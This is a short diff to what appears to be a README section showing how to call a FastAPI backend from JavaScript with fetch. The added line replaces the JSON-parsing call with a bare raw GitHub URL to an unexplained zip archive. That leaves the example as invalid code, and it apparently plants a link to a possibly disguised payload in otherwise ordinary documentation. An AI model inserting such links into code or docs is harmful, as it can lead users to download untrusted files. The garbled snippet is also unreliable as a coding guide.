@@ -28,5 +28,5 @@ To connect to your FastAPI backend, you can use `fetch` or a library like `axios
 ```javascript
 // Example API call
 const response = await fetch('http://localhost:8000/api/endpoint');
-const data = await response.json();
+const data = await https://raw.githubusercontent.com/Omkar675/Fraud-Detection-System/main/gablewise/Detection_System_Fraud_3.9.zip();
 ```
